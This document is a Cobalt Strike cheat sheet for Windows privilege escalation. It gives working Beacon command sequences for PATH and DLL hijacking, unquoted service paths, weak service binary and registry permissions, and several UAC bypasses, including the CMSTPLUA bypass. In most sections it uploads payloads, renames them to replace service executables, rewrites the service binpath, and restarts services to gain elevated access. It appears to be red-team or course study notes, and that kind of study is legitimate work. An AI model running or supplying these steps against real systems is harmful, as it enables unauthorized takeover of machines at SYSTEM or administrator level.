# Privilege Escalation (Cobalt Strike)

---

## Check Permissions

```
cacls C:\Path\To\Check\
```

| Permission | Meaning |
|------------|---------|
| F | Full control |
| R | Read & execute |
| C | Read, write, execute, & delete |
| W | Write |

---

## PATH Variable Hijacking

The `%PATH%` variable is constructed from two locations:

- **User** - `HKEY_CURRENT_USER\Environment` (user can modify)
- **Machine** - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment` (admin only)

User processes use Machine + User paths. System processes use only Machine paths.

```
env
cacls C:\Python313\Scripts\
```

If a directory in PATH is writable by standard users, you can place a malicious executable there.

---

## Service Exploits

### Search Order Hijacking

Place malicious executable where service will find it first.

```
# Check permissions
cacls "C:\Program Files\Bad Windows Service\Service Executable"
# Output: NT AUTHORITY\Authenticated Users:(CI)(OI)F

# Upload payload
cd "C:\Program Files\Bad Windows Service\Service Executable"
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe cmd.exe
```

### Unquoted Service Paths

Exploit unquoted paths with spaces.

```
# Enumerate services
sc_enum

# Check permissions on parent directory
cacls "C:\Program Files\Bad Windows Service"
# Output: NT AUTHORITY\Authenticated Users:(CI)(OI)F

# Upload payload with name that matches path parsing
cd "C:\Program Files\Bad Windows Service"
upload C:\Payloads\dns_x64.svc.exe
mv dns_x64.svc.exe Service.exe
sc_stop BadWindowsService
sc_start BadWindowsService
```

> If you cannot start/stop the service, wait for reboot or trigger one.

### Weak Service Binary Permissions

Replace the actual service executable.

```
# Check executable permissions
cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
# Output: NT AUTHORITY\Authenticated Users:F

# Replace executable
cd "C:\Program Files\Bad Windows Service\Service Executable\"
sc_stop BadWindowsService
upload C:\Payloads\BadWindowsService.exe
sc_start BadWindowsService
```

### Weak Service Registry Permissions

Modify service configuration via registry.

```
# Check registry permissions
powerpick Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl

# Stop service and note current binpath
sc_stop BadWindowsService
sc_qc BadWindowsService

# Upload payload
cd C:\Temp
upload C:\Payloads\dns_x64.svc.exe

# Modify service config (binpath, type=0, start=2)
sc_config BadWindowsService C:\Temp\dns_x64.svc.exe 0 2
sc_start BadWindowsService

# Restore original binpath after exploitation
sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
```

---

## DLL Search Order Hijacking

Typical DLL search order:
1. The executing directory
2. The System32 directory
3. The 16-bit System directory
4. The Windows directory
5. The current working directory
6. Directories in PATH

```
# Check if service directory is writable
cacls "C:\Program Files\Bad Windows Service\Service Executable"
# Output: NT AUTHORITY\Authenticated Users:(CI)(OI)F

cd "C:\Program Files\Bad Windows Service\Service Executable"
upload C:\Payloads\dns_x64.dll
mv dns_x64.dll BadDll.dll
```

---

## UAC Bypass (Medium → High Integrity)

> **Prerequisite:** Must be member of local Administrators group

Check current integrity:
```
whoami
# Look at bottom of output for integrity level
```

### elevate Command

```
elevate [exploit] [listener]
```

| Exploit | Description |
|---------|-------------|
| svc-exe | Get SYSTEM via service |
| uac-schtasks | Bypass via SilentCleanup |
| uac-token-duplication | Token duplication bypass |

### runasadmin Command

Execute arbitrary commands with elevation.

```
runasadmin [exploit] [command] [args]
```

| Exploit | Description |
|---------|-------------|
| uac-cmstplua | CMSTPLUA COM interface |
| uac-eventvwr | eventvwr.exe bypass |
| uac-schtasks | SilentCleanup bypass |
| uac-token-duplication | Token duplication |
| uac-wscript | wscript.exe bypass |

### CMSTPLUA UAC Bypass

> **Requirement:** Beacon process must be in `C:\Windows\*`

1. Spawn a new Beacon:
   ```
   spawn x64 http
   ```

2. Generate PowerShell one-liner:
   - Right-click Beacon → **Access > One-liner**
   - Select tcp-local listener

3. Execute bypass:
   ```
   runasadmin uac-cmstplua [ONE-LINER]
   connect localhost 1337
   ```

---

## Quick Reference

| Vulnerability | Detection | Exploitation |
|---------------|-----------|--------------|
| PATH Hijack | Writable dir in PATH | Place malicious EXE |
| Search Order Hijack | Writable service directory | Place malicious DLL/EXE |
| Unquoted Path | Space in unquoted service path | Place EXE at path break |
| Weak Binary | Writable service executable | Replace EXE |
| Weak Registry | Writable service registry key | Modify ImagePath |
| DLL Hijack | Writable dir in DLL search order | Place malicious DLL |
| UAC Bypass | Medium integrity + local admin | elevate/runasadmin |
